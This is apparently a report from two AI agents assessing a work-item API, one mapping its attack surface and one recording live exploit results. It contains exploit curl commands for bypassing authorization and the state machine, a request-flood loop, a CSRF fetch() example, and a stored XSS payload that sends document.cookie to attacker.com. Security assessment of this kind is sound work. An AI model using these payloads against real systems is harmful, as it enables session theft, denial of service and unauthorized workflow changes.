# Attack Surface Map
**Team:** TheGuardians  
**Agent:** pen-tester  
**Date:** 2026-06-08  
**Scope:** White-box static analysis of `Source/Backend/` and `Source/Frontend/`  
**Config:** `Teams/TheGuardians/security.config.yml`  
**Handoff to:** red-teamer

---

## Executive Summary

The application exposes a fully unauthenticated, unauthorised HTTP API. Every endpoint — including state-machine transitions, approvals, dispatch, intake webhooks, and the Prometheus metrics feed — is accessible without credentials, tokens, or any identity proof. The combination of missing auth, several business-logic flaws in the state machine, and enum validation gaps in the intake layer creates multiple end-to-end exploit chains. **All findings are Theoretical and require dynamic verification.**

---

## Findings

---

### PEN-001: No Authentication on Any Endpoint — Complete Access Control Absence
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` lines 12–44
- **Vulnerability Description:**
  `app.ts` registers zero authentication middleware. The only middleware applied before routes is `express.json()` (body parser) and a debug request logger. No JWT verification, no session, no API key, no OAuth — nothing. Every route in every router (`workItems`, `workflow`, `dashboard`, `intake`) is reachable by any unauthenticated HTTP client.
- **Potential Exploit Path:**
  1. Send any HTTP request to `http://localhost:3001/api/work-items` (or any route).
  2. No `Authorization` header, no cookie, no token required.
  3. Full read/write access to all work-item data and all workflow transitions.
- **Red Team Handoff Notes:**
  - Confirm with: `curl http://localhost:3001/api/work-items` — expect 200 with data (not 401).
  - Confirm write: `curl -X POST http://localhost:3001/api/work-items -H 'Content-Type: application/json' -d '{"title":"pwned","description":"no auth needed","type":"feature","priority":"critical","source":"manual"}'` — expect 201.
  - This is the root precondition for all other PEN-findings below.

---

### PEN-002: No Role-Based Access Control — Any Caller Can Approve, Reject, or Dispatch
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 93–296
- **Vulnerability Description:**
  The approve (`POST /:id/approve`), reject (`POST /:id/reject`), and dispatch (`POST /:id/dispatch`) endpoints perform high-privilege workflow state transitions but enforce **zero role checks**. There is no concept of an approver role, reviewer role, or dispatcher role. The only guard is a status-state check (e.g., "item must be in proposed"). Any anonymous caller who knows an item ID can approve, reject, or dispatch it.
- **Potential Exploit Path:**
  1. Obtain or enumerate a work-item ID in `proposed` or `reviewing` status (see PEN-007 for enumeration).
  2. `POST /api/work-items/<id>/approve` with empty body → item moves to `approved`.
  3. `POST /api/work-items/<id>/dispatch` with `{"team":"TheATeam"}` → item moves to `in-progress`.
  4. Full workflow driven end-to-end without any credentials.
- **Red Team Handoff Notes:**
  - Try: `curl -X POST http://localhost:3001/api/work-items/<id>/approve -H 'Content-Type: application/json' -d '{}'`
  - Try reject: `curl -X POST http://localhost:3001/api/work-items/<id>/reject -H 'Content-Type: application/json' -d '{"reason":"attacker-injected rejection"}'`
  - **Objective from config:** "Bypass work item state machine to reach an invalid status."

---

### PEN-003: State Machine Bypass via `overrideRoute` — Instant Approval Without Assessment
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` line 57; `Source/Backend/src/services/router.ts` lines 66–88
- **Vulnerability Description:**
  `POST /api/work-items/:id/route` accepts an optional `overrideRoute` field in the request body. When `overrideRoute === "fast-track"` is sent, `classifyRoute()` returns `targetStatus: WorkItemStatus.Approved` unconditionally, **skipping the entire assessment pod**. There is no authentication, no role check, and no validation that the caller is authorised to override routing decisions. Any caller can move any `backlog` item directly to `approved` in a single request.
- **Potential Exploit Path:**
  1. Create a work item (or use an existing backlog item): `POST /api/work-items`.
  2. Override routing: `POST /api/work-items/<id>/route` with body `{"overrideRoute":"fast-track"}`.
     - `classifyRoute()` sees `overrideRoute` is truthy → returns `{route: "fast-track", targetStatus: "approved"}`.
     - Item status transitions: `backlog → routing → approved` in a single call.
  3. Dispatch immediately: `POST /api/work-items/<id>/dispatch` with `{"team":"TheATeam"}`.
     - Item is now `in-progress` — full lifecycle in 3 unauthenticated requests.
- **Red Team Handoff Notes:**
  - Payload: `{"overrideRoute":"fast-track"}`
  - Confirm item goes directly to `approved` (skipping `proposed`/`reviewing`/`rejected`).
  - **This is the primary exploit chain for the red-team objective:** "Bypass work item state machine."
  - Also try `{"overrideRoute":"full-review"}` to force a specific route even when fast-track criteria are met.

---

### PEN-004: Unauthenticated Intake Webhooks with Missing Enum Validation
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts` lines 11–55
- **Vulnerability Description:**
  `POST /api/intake/zendesk` and `POST /api/intake/automated` have two compounding vulnerabilities:
  1. **No authentication or HMAC signature verification** — the Zendesk webhook has no `X-Zendesk-Webhook-Signature` validation. Any caller can forge Zendesk events.
  2. **No enum validation on `type` or `priority`** — `body.type` and `body.priority` are passed directly to `store.createWorkItem()` without checking against `Object.values(WorkItemType)` or `Object.values(WorkItemPriority)`. Compare with the properly-validated `POST /api/work-items` (workItems.ts lines 29–50 which validates both fields). Invalid values bypass the type system entirely.
- **Potential Exploit Path:**
  1. `POST /api/intake/zendesk` with body `{"title":"x","description":"legitimate description here","type":"injected-type","priority":"injected-priority"}`.
  2. `store.createWorkItem()` stores the item with non-enum type/priority values.
  3. Downstream: `isFastTrack()`, `isFullReview()`, `assessAsDomainExpert()`, dashboard count aggregation all receive unexpected values — potential crashes or misrouting.
  4. For Zendesk spoofing: `POST /api/intake/zendesk` with any crafted payload creates a legitimate work item sourced as "zendesk".
- **Red Team Handoff Notes:**
  - Zendesk spoof: `curl -X POST http://localhost:3001/api/intake/zendesk -H 'Content-Type: application/json' -d '{"title":"spoofed","description":"injected from attacker","type":"feature","priority":"critical"}'`
  - Invalid enum: `curl -X POST http://localhost:3001/api/intake/zendesk -H 'Content-Type: application/json' -d '{"title":"x","description":"y test","type":"EXPLOIT","priority":"EXPLOIT"}'` — expect 201 (not 400).
  - Try values like `"type": null`, `"type": true`, `"priority": 99999`.

---

### PEN-005: Soft-Deleted Item Accessible via Dependency Reference — Permanent Blocker Injection
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts` lines 64–99; `Source/Backend/src/store/workItemStore.ts` line 24
- **Vulnerability Description:**
  `findById()` returns `undefined` for soft-deleted items. In `computeHasUnresolvedBlockers()` and `isReady()`, when iterating `item.blockedBy`, if `store.findById(link.blockerItemId)` returns `undefined` (deleted blocker), the code evaluates `!blocker` as `true` → item is treated as having an **unresolved blocker indefinitely**. There is no mechanism to remove or clean up this phantom dependency. An attacker can permanently block any approved item from being dispatched by: creating a dependency from target → attacker-controlled item, then deleting the attacker-controlled item.
- **Potential Exploit Path:**
  1. Create blocker item A: `POST /api/work-items` → get `id_A`.
  2. Move target item B to `approved` status.
  3. Add dependency: `POST /api/work-items/<id_B>/dependencies` with `{"action":"add","blockerId":"<id_A>"}`.
  4. Soft-delete item A: `DELETE /api/work-items/<id_A>`.
  5. Attempt to dispatch item B: `POST /api/work-items/<id_B>/dispatch` → **blocked indefinitely** because `findById(id_A)` returns `undefined` → `!blocker = true` → unresolved.
  6. `GET /api/work-items/<id_B>/ready` reports `{ready: false}` with `unresolvedBlockers` referencing the deleted item — but there is no way to remove this via the dependency endpoint (removeDependency requires blocker to exist is NOT required, so removal is actually possible via `{"action":"remove","blockerId":"<id_A>"}`).
  - **Note:** The removal path exists but the blocker-as-deleted creates misleading state and can be exploited if an attacker prevents the victim from knowing to run removal.
  - **Red-team objective:** "Access or modify a soft-deleted work item via direct ID reference."
- **Red Team Handoff Notes:**
  - Follow the 6-step chain above.
  - Confirm dispatch is blocked even though blocker is gone.
  - Try `GET /api/work-items/<id_B>/ready` — confirm `ready: false` with deleted-item reference.
  - Also test: `POST /api/work-items/<id_B>/dependencies {"action":"remove","blockerId":"<id_A>"}` — this should succeed (removeDependency doesn't require blocker to exist), confirming the cleanup bypass is available but non-obvious.

---

### PEN-006: Unauthenticated Prometheus Metrics Endpoint — Information Disclosure
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` lines 34–37
- **Vulnerability Description:**
  `GET /metrics` serves Prometheus-format system metrics with no authentication. Exposed data includes: `workflow_items_created_total` (by source/type), `workflow_items_dispatched_total` (by team), `workflow_items_assessed_total` (by verdict), `workflow_items_routed_total` (by route), plus default Node.js process metrics (memory, CPU, event loop lag, garbage collection). This reveals internal system usage patterns, team names, item throughput, and application version info.
- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics` — no auth required.
  2. Read `workflow_items_dispatched_total{team="TheATeam"}` counter to understand workload.
  3. Read Node.js process metrics to identify memory pressure or event loop bottlenecks useful for timing attacks.
- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/metrics`
  - Look for: `workflow_items_*`, `process_*`, `nodejs_*` metric families.

---

### PEN-007: Unbounded Pagination — Memory Exhaustion / DoS
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 68–74; `Source/Backend/src/routes/dashboard.ts` lines 17–18
- **Vulnerability Description:**
  The `limit` query parameter on `GET /api/work-items` and the `limit` parameter on `GET /api/dashboard/activity` are parsed with `parseInt()` and passed directly to the store/service with no upper-bound cap. With enough items in the store, passing `limit=999999` forces the server to: (a) build an array of all items, (b) serialize the entire structure (including `changeHistory` and `assessments` arrays per item), and (c) return it in one HTTP response — exhausting memory and causing server slowdown or crash.
- **Potential Exploit Path:**
  1. Seed the store with a large number of items (achievable via unauthenticated `POST /api/work-items`).
  2. `GET /api/work-items?limit=999999` — forces full in-memory scan and serialisation.
  3. `GET /api/dashboard/activity?limit=999999&page=1` — same pattern, additionally flattens all `changeHistory` arrays across all items.
- **Red Team Handoff Notes:**
  - `curl "http://localhost:3001/api/work-items?limit=999999"`
  - `curl "http://localhost:3001/api/dashboard/activity?limit=999999"`
  - Measure response time and server memory before/after.
  - Also try `page=-1`, `page=NaN`, `limit=NaN` to test NaN-path behavior (slice with NaN offset returns empty, but parsing is unchecked).

---

### PEN-008: Business Logic Flaw — `NeedsClarification` Verdict Maps to `Rejected` Status
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/assessment.ts` lines 162–173
- **Vulnerability Description:**
  In `runAssessmentPod()`, the pod-lead assessment can yield three verdicts: `Approve`, `Reject`, or `NeedsClarification`. However, in `assessWorkItem()`, the `targetStatus` mapping is binary:
  ```typescript
  if (podLeadAssessment.verdict === AssessmentVerdict.Approve) {
    targetStatus = WorkItemStatus.Approved;
  } else {
    targetStatus = WorkItemStatus.Rejected;  // ← NeedsClarification falls here
  }
  ```
  A `NeedsClarification` verdict from the domain-expert (triggered when `item.complexity` is missing) results in the item being **permanently rejected** instead of entering a clarification loop. Items that simply lack a complexity field are irrecoverably rejected, but can only re-enter from `backlog` via the `Rejected → Backlog` transition — silently discarding legitimate work.
- **Potential Exploit Path:**
  1. Create a work item without `complexity` set.
  2. Route it: `POST /api/work-items/<id>/route` → enters `proposed`.
  3. Assess it: `POST /api/work-items/<id>/assess`.
     - `assessAsDomainExpert()` returns `NeedsClarification` (complexity missing).
     - `assessAsPodLead()` returns `NeedsClarification`.
     - `assessWorkItem()` maps this to `Rejected`.
  4. Item is rejected even though the intended business outcome was "request clarification, not reject."
  - **To exploit for state manipulation:** Attacker can **force** any item needing clarification into `Rejected` status (triggering `onItemResolved` cascade), then items depending on this item will auto-dispatch even though the blocker was not legitimately resolved.
- **Red Team Handoff Notes:**
  - Create item without complexity: `{"title":"test item A","description":"some description here","type":"feature","priority":"medium","source":"manual"}` (no `complexity`).
  - Route → Assess → observe item lands in `rejected` (not `reviewing` or `proposed`).
  - **Red-team objective:** "Submit a malformed assessment verdict that bypasses routing logic."
  - Chain with dependency: have item B depend on item A. Assess A with missing complexity → A gets rejected → `onItemResolved` → B auto-dispatches if B is Approved.

---

### PEN-009: State Machine Bypass — `routing` Status Can Be Directly Approved, Skipping Assessment Pod
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 106–110; `Source/Shared/types/workflow.ts` line 218
- **Vulnerability Description:**
  `VALID_STATUS_TRANSITIONS[WorkItemStatus.Routing]` includes `WorkItemStatus.Approved` as a valid target. The `/approve` endpoint's guard is `isValidTransition(item.status, WorkItemStatus.Approved)`. If an item is somehow left in the `routing` transient state (e.g., if a `/route` call crashes mid-execution, or if the caller manipulates state), a direct `POST /:id/approve` call succeeds and moves the item from `routing → approved`, entirely bypassing the assessment pod.

  While `routing` is a transient state that `routeWorkItem()` normally exits immediately, the status IS persisted in the store between the two `updateWorkItem()` calls:
  - The service pushes the `routing` entry to `changeHistory` and calls `updateWorkItem` at line 107–109 of router.ts — **but actually there is no intermediate store write for the routing transient state**. The service adds history entries and then calls `updateWorkItem` with the final status.
  - However, `VALID_STATUS_TRANSITIONS` explicitly allows `routing → approved`, and the approve endpoint checks this table. If any code path puts an item in `routing` status in the store (e.g., a future bug, or direct store manipulation), the approve shortcut is available.
- **Potential Exploit Path:**
  1. If item is in `routing` status (see above): `POST /api/work-items/<id>/approve` → succeeds per transition table.
  2. Combined with PEN-001 (no auth): this is available to any caller.
- **Red Team Handoff Notes:**
  - Confirm the transition table allows `routing → approved`: check `VALID_STATUS_TRANSITIONS[routing]`.
  - Attempt to leave an item in routing state by sending concurrent route requests or using a race condition.
  - Try: place item in routing state manually (if store is writable) → approve → verify `approved` without assessment.

---

### PEN-010: `overrideRoute` Parameter Not Validated Against Enum — Invalid State Injection
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` line 57; `Source/Backend/src/services/router.ts` lines 66–87
- **Vulnerability Description:**
  `body.overrideRoute` is cast via `as RouteWorkItemRequest` (TypeScript compile-time only) but never runtime-validated against `Object.values(WorkItemRoute)`. Any arbitrary string can be passed. In `classifyRoute()`:
  - If `overrideRoute` is truthy (any non-empty string), it short-circuits and returns `{ route: overrideRoute, targetStatus: overrideRoute === "fast-track" ? Approved : Proposed }`.
  - The item is stored with `route = "<arbitrary string>"` — an invalid enum value in the database-equivalent (in-memory store).
  - This corrupts the item's `route` field and can break any downstream logic that switches on `WorkItemRoute` values.
- **Potential Exploit Path:**
  1. `POST /api/work-items/<id>/route` with body `{"overrideRoute":"INVALID_ROUTE_VALUE"}`.
  2. `classifyRoute()` returns `{route: "INVALID_ROUTE_VALUE", targetStatus: "proposed"}`.
  3. Item's `route` field is set to `"INVALID_ROUTE_VALUE"` — corrupt enum state persisted.
  4. Dashboard, assessments, and routing logic receive unexpected values.
- **Red Team Handoff Notes:**
  - Payload: `{"overrideRoute":"PWNED"}`, `{"overrideRoute":true}`, `{"overrideRoute":null}`.
  - Confirm item's `route` field contains the injected value in the response.
  - Try `{"overrideRoute":""}` — empty string is falsy, so classifyRoute auto-classifies (no injection).
  - Try `{"overrideRoute":"fast-track"}` — the real enum value, triggers PEN-003.

---

### PEN-011: Dashboard Queue Endpoint Exposes Full Item Details Including Internal Fields
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/dashboard.ts` line 27; `Source/Backend/src/services/dashboard.ts` lines 57–76
- **Vulnerability Description:**
  `GET /api/dashboard/queue` returns a `QueueGroup[]` where each group contains the full `WorkItem[]` array — including `changeHistory` (every historical state change), `assessments` (all assessment pod notes and verdicts), `blockedBy` / `blocks` (dependency graph), and `deleted` flag. No field projection or redaction is applied. Combined with PEN-001 (no auth), this exposes the complete internal state of every non-deleted work item to any caller.
  
  Additionally, `GET /api/dashboard/activity` returns flattened `changeHistory` entries across all items, including `oldValue`, `newValue`, `agent`, `reason` — internal workflow agent decisions.
- **Potential Exploit Path:**
  1. `GET /api/dashboard/queue` — receive all items across all status queues with full internal state.
  2. `GET /api/dashboard/activity?limit=999999` — receive full audit trail of all state changes.
  3. Use this to enumerate valid work-item IDs (UUIDs) for targeted attacks.
- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/api/dashboard/queue | jq '.data[].items[].id'` — enumerate all item IDs.
  - `curl http://localhost:3001/api/dashboard/activity` — read internal change history.
  - **Red-team objective:** "Enumerate all work items without pagination limit enforcement."

---

### PEN-012: Cascade Auto-Dispatch Triggered by Unauthenticated Rejection
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 192–208; `Source/Backend/src/services/dependency.ts` lines 251–315
- **Vulnerability Description:**
  `POST /api/work-items/:id/reject` calls `onItemResolved(id)` after rejection, which auto-dispatches all items that: (a) are `approved`, (b) blocked by the rejected item, and (c) now have no unresolved blockers. Since there is no authentication (PEN-001), an attacker can trigger production dispatch of approved items simply by rejecting their blockers — without being an authorized dispatcher or approver.
- **Potential Exploit Path:**
  1. Identify an item B in `approved` status with a blocker A (via PEN-011 dashboard enumeration).
  2. `POST /api/work-items/<id_A>/reject` with `{"reason":"forced rejection"}`.
  3. `onItemResolved(id_A)` fires, finds item B is now unblocked and Approved.
  4. Item B is auto-dispatched to a team and moves to `in-progress`.
  5. The dispatch occurs without any dispatcher interaction.
- **Red Team Handoff Notes:**
  - Set up: item A blocks item B, item B is Approved.
  - Reject A → confirm B moves to `in-progress` automatically.
  - No auth required for the reject call.

---

### PEN-013: No CORS Policy — Cross-Origin API Access
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (no CORS middleware registered)
- **Vulnerability Description:**
  No CORS (Cross-Origin Resource Sharing) headers are set by the backend. Express's default behavior does not add `Access-Control-Allow-Origin` headers, but does allow cross-origin requests to be received and processed. A malicious website can make `fetch()` calls to `http://localhost:3001/api/work-items` and receive responses (for simple requests). Combined with PEN-001 (no auth), a CSRF-style attack from a third-party origin can perform any state-changing action using the victim's browser.
- **Potential Exploit Path:**
  1. Host a malicious page that executes `fetch("http://localhost:3001/api/work-items/<id>/approve", {method:"POST"})`.
  2. Victim visits the page; their browser triggers the approval without any user intent.
  3. No SameSite cookies or CSRF tokens exist (since there's no session at all), making this trivially exploitable.
- **Red Team Handoff Notes:**
  - `curl -H "Origin: http://evil.com" http://localhost:3001/api/work-items` — confirm no `Access-Control-Allow-Origin` response header restriction.
  - For browser-based test: craft an HTML page with fetch() calls to the API.

---

### PEN-014: No Rate Limiting on Any Endpoint — Brute-Force and Enumeration
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (no rate-limit middleware)
- **Vulnerability Description:**
  No rate limiting is applied to any endpoint. This enables: (a) brute-force enumeration of work-item UUIDs, (b) flood creation of work items to exhaust in-memory store, (c) rapid-fire state-transition abuse (e.g., bulk approval, bulk rejection), (d) DoS by sending large payloads or many concurrent requests.
- **Potential Exploit Path:**
  1. Script concurrent `POST /api/work-items` requests to fill the in-memory store with garbage items.
  2. `GET /api/work-items?limit=999999` to force full serialization (combines with PEN-007).
  3. Enumerate IDs by scripting `GET /api/work-items/<uuid>` calls — any 200 (vs 404) reveals a valid ID.
- **Red Team Handoff Notes:**
  - `for i in {1..1000}; do curl -s -X POST http://localhost:3001/api/work-items -H 'Content-Type: application/json' -d '{"title":"flood","description":"flood test item","type":"bug","priority":"low","source":"manual"}' & done`
  - Monitor memory usage and response time degradation.

---

### PEN-015: Transient `routing` State Not Atomically Persisted — Race Condition
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/router.ts` lines 107–143
- **Vulnerability Description:**
  `routeWorkItem()` builds `changeHistory` entries for `routing` → final status transitions and then calls `store.updateWorkItem()` once with the final status. Because Node.js is single-threaded and the in-memory store is synchronous, this is not exploitable under normal single-process conditions. However, if the store were ever made async (e.g., migrated to a real database), the two conceptual state transitions (backlog→routing, routing→final) happening in a single `updateWorkItem()` call would not match the `changeHistory` record, creating an inconsistency that could be exploited to leave items in `routing` state. Documented here as a forward-looking finding.
- **Red Team Handoff Notes:**
  - Low priority for current in-memory store.
  - Verify by sending two concurrent `POST /:id/route` requests for the same item — both will likely fail as the first transitions the item out of `backlog` before the second reads it.

---

## Attack Chain Summary

| Chain | Steps | Objective Covered |
|-------|-------|-------------------|
| **Chain A: Full Lifecycle Without Auth** | PEN-001 → PEN-003 (overrideRoute fast-track) → PEN-002 (dispatch) | Bypass state machine; unauthenticated dispatch |
| **Chain B: NeedsClarification → Forced Rejection → Cascade Dispatch** | PEN-001 → PEN-008 (assess missing complexity) → PEN-012 (cascade) | Malformed verdict bypasses routing; cascade dispatch of dependent item |
| **Chain C: Webhook Spoofing with Invalid Type** | PEN-001 → PEN-004 (zendesk intake no validation) | Inject items with arbitrary type/priority values |
| **Chain D: Permanent Dependency Block via Deleted Item** | PEN-001 → PEN-005 | Block any approved item from being dispatched permanently |
| **Chain E: Full Enumeration via Dashboard** | PEN-001 → PEN-011 → PEN-007 (limit=999999) | Enumerate all work items without pagination enforcement |

---

## Red Team Objectives Coverage

| Config Objective | Relevant PEN IDs | Status |
|-----------------|-----------------|--------|
| Bypass work item state machine to reach an invalid status | PEN-003, PEN-009, PEN-010 | Ready to exploit |
| Access or modify a soft-deleted work item via direct ID reference | PEN-005 | Ready to exploit |
| Submit a malformed assessment verdict that bypasses routing logic | PEN-008 | Ready to exploit |
| Enumerate all work items without pagination limit enforcement | PEN-011, PEN-007 | Ready to exploit |

---

## OWASP Focus Coverage

| OWASP Category | PEN IDs |
|---------------|---------|
| A01: Broken Access Control | PEN-001, PEN-002, PEN-003, PEN-009, PEN-013 |
| A02: Cryptographic Failures | PEN-006 (metrics exposure), PEN-004 (no webhook HMAC) |
| A03: Injection | PEN-010 (enum injection), PEN-004 (type injection via intake) |
| A07: Identification and Authentication Failures | PEN-001 (no auth), PEN-004 (no webhook sig) |
| A08: Software and Data Integrity Failures | PEN-003 (state machine bypass), PEN-008 (business logic flaw), PEN-012 (cascade trigger) |

---

*All findings are Theoretical — static analysis only. No live requests were made. The red-teamer must verify each finding dynamically.*

---

## Red Team Results

**Agent:** red-teamer  
**Date:** 2026-06-08  
**Environment:** Ephemeral — `docker-compose.test.yml` (portal app on port 3001)  
**Total chains attempted:** 8  
**Confirmed breaches:** 7  
**Objectives achieved:** 4 / 4

> ⚠️ **Architecture Discrepancy Note**: The pen-tester analyzed `Source/Backend/` (work-items API, `/api/work-items` routes). The `docker-compose.test.yml` builds the `portal/` app — a **separate codebase** with `/api/feature-requests` routes. All red-team findings below are verified against the **running portal service**. The pen-tester findings (PEN-001 through PEN-015) describe analogous vulnerabilities in the Source/Backend codebase, which was not reachable in this test run. The portal app exhibits the same vulnerability classes independently.

---

### RED-001: Complete Authentication Bypass — All Endpoints
- **Severity:** Critical
- **Objective Achieved:** Yes (root precondition for all other chains)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `http://localhost:3001/api/feature-requests`, `/api/bugs`, `/api/feature-requests/:id/force-approve`, `/api/feature-requests/:id/deny`
- **Based On:** PEN-001, PEN-002 (portal app equivalent)
- **Exploit Scenario:**
  1. `curl http://localhost:3001/api/feature-requests` → HTTP 200 with all 17 items — no `Authorization` header, no token, no session required.
  2. `POST /api/feature-requests` with arbitrary payload → HTTP 201, item created (FR-0020).
  3. `POST /api/feature-requests/FR-0021/force-approve` with no credentials → HTTP 200, status=`approved` — high-privilege action completed anonymously.
  4. `POST /api/feature-requests/FR-0022/deny` with no credentials → HTTP 200, status=`denied` — any caller can deny any feature request.
  5. `POST /api/bugs` with no credentials → HTTP 201, BUG-0003 created — bug-tracking write access also open.
  6. Zero authentication middleware is registered in `portal/Backend/src/index.ts`. CORS is configured but enforces no identity.
- **Recommendation:** Add authentication middleware (JWT/session) as the first middleware after body parsing. All state-changing endpoints (approve, force-approve, deny, vote, PATCH, DELETE) require role enforcement.

---

### RED-002: Phantom Blocker Denial-of-Service — Permanent Dispatch Block via Hard Delete
- **Severity:** High
- **Objective Achieved:** Yes — "Access or modify a soft-deleted work item via direct ID reference"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `DELETE /api/feature-requests/:id`, `GET /api/feature-requests/:id/ready`
- **Based On:** PEN-005 (portal equivalent)
- **Exploit Scenario:**
  1. Create blocker FR-0023 and dependent FR-0024. Approve FR-0024 via `POST /force-approve`.
  2. Add dependency: `POST /api/feature-requests/FR-0024/dependencies {"action":"add","blocker_id":"FR-0023"}` → FR-0024 has unresolved blocker.
  3. Hard-delete FR-0023: `DELETE /api/feature-requests/FR-0023` → HTTP 204. `GET /api/feature-requests/FR-0023` → 404.
  4. `GET /api/feature-requests/FR-0024/ready` → `{"ready":false,"unresolved_blockers":[{"item_id":"FR-0023","title":"Unknown","status":"unknown"}]}`.
  5. `PATCH /api/feature-requests/FR-0024 {"status":"in_development"}` → redirected to `pending_dependencies`.
  6. FR-0024 is **permanently stuck** — `deleteFeatureRequest()` hard-deletes the row but does NOT `DELETE FROM dependencies WHERE blocker_item_id = ?`. The LEFT JOIN in `getBlockedBy()` returns `status=null` → mapped to `"unknown"` → not in `RESOLVED_STATUSES` → permanently unresolved.
  7. No recovery path exists without manual DB intervention (no API endpoint to remove a dependency referencing a non-existent item).
- **Recommendation:** `deleteFeatureRequest()` must also delete all rows in the `dependencies` table where `blocker_item_id = id` OR `blocked_item_id = id`. Add CASCADE DELETE on the FK constraint.

---

### RED-003: 'denied' Not in RESOLVED_STATUSES — Cascade Failure Permanently Blocks Dependents
- **Severity:** High
- **Objective Achieved:** Yes — "Submit a malformed assessment verdict that bypasses routing logic" (analog: denial doesn't resolve dependencies)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST /api/feature-requests/:id/deny`, `GET /api/feature-requests/:id/ready`
- **Based On:** PEN-008, PEN-012 (portal equivalent)
- **Exploit Scenario:**
  1. Create blocker FR-0025 and dependent FR-0026. Vote and force-approve FR-0026. Add dependency FR-0026 → FR-0025.
  2. `PATCH /api/feature-requests/FR-0026 {"status":"in_development"}` → redirected to `pending_dependencies`.
  3. `POST /api/feature-requests/FR-0025/deny {"comment":"denied"}` → FR-0025 status=`denied`.
  4. `GET /api/feature-requests/FR-0026/ready` → `{"ready":false,"unresolved_blockers":[{"status":"denied"}]}`.
  5. `PATCH /api/feature-requests/FR-0026 {"status":"in_development"}` → `"Invalid status transition: pending_dependencies → in_development"`.
  6. FR-0026 is **permanently stuck**: `denyFeatureRequest()` does NOT call `onItemCompleted()`, and `'denied'` is not in `RESOLVED_STATUSES = ['completed','resolved','closed','duplicate','deprecated']`. The cascade that would advance dependents never fires.
  7. The only recovery is manually removing the dependency (known only if caller reads the docs) — silent to the end user.
- **Recommendation:** Add `'denied'` to `RESOLVED_STATUSES`, OR make `denyFeatureRequest()` call `onItemCompleted()` to trigger the cascade so dependents are re-evaluated when a blocker is denied.

---

### RED-004: Unauthenticated Prometheus Metrics Endpoint
- **Severity:** Medium
- **Objective Achieved:** Partial (information disclosure; not a primary config objective)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/metrics`
- **Based On:** PEN-006 (direct equivalent)
- **Exploit Scenario:**
  1. `curl http://localhost:3001/metrics` → HTTP 200.
  2. Response contains 39 metric families: `ai_voting_invocations_total`, `feature_request_transitions_total`, `dependency_operations_total`, `dispatch_gating_events_total`, `cycle_detection_events_total`, plus full Node.js process metrics (RSS, heap, CPU, event-loop lag).
  3. Operational intelligence exposed: vote counts per round, dispatch patterns, dependency usage rate, server load — useful for timing attacks and reconnaissance.
- **Recommendation:** Protect `/metrics` behind IP allowlist or bearer token. Do not expose process internals to unauthenticated callers.

---

### RED-005: No Pagination Enforcement — Full Dataset Enumeration
- **Severity:** Medium
- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET /api/feature-requests`, `GET /api/bugs`
- **Based On:** PEN-007, PEN-011 (portal equivalent)
- **Exploit Scenario:**
  1. `GET /api/feature-requests` → returns all 23 feature requests in one response — no pagination metadata (`page`, `total`, `limit`, `totalPages` absent).
  2. `GET /api/feature-requests?limit=1` → still returns all 23 items — `limit` parameter is accepted but silently ignored in `listFeatureRequests()` (query has no `LIMIT` clause).
  3. Each item exposes: `votes[]` (all AI agent decisions), `blocked_by[]`, `blocks[]`, `has_unresolved_blockers`, `human_approval_comment`, full timestamps.
  4. Full dependency graph of the organisation's feature backlog exposed in a single unauthenticated call.
- **Recommendation:** Implement server-side pagination (`LIMIT`/`OFFSET` in SQL). Add an enforced max page size (e.g., 100). Remove or redact internal fields (`votes`, `human_approval_comment`) from list endpoints.

---

### RED-006: Stored XSS — No Server-Side Input Sanitization
- **Severity:** High
- **Objective Achieved:** Partial (stored payload confirmed; browser rendering depends on frontend)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST /api/feature-requests`, `GET /api/feature-requests/:id`
- **Based On:** Not in pen-tester map (newly discovered in portal app)
- **Exploit Scenario:**
  1. `POST /api/feature-requests {"title":"<script>alert(document.cookie)</script>","description":"<img src=x onerror=alert(1)> <svg onload=fetch('http://attacker.com/?c='+document.cookie)>"}` → HTTP 201, FR-0027 created.
  2. `GET /api/feature-requests/FR-0027` → response contains raw `<script>`, `<img onerror>`, `<svg onload>` tags stored verbatim.
  3. Any frontend that renders `title` or `description` as raw HTML will execute the payload, exfiltrating session data to the attacker.
  4. Combined with RED-001 (no auth), any attacker can plant XSS payloads into the shared feature backlog.
- **Recommendation:** Sanitize all string inputs server-side using a library such as `DOMPurify` (server-side) or encode HTML entities before storing. Apply Content-Security-Policy headers to mitigate execution even if sanitization is bypassed.

---

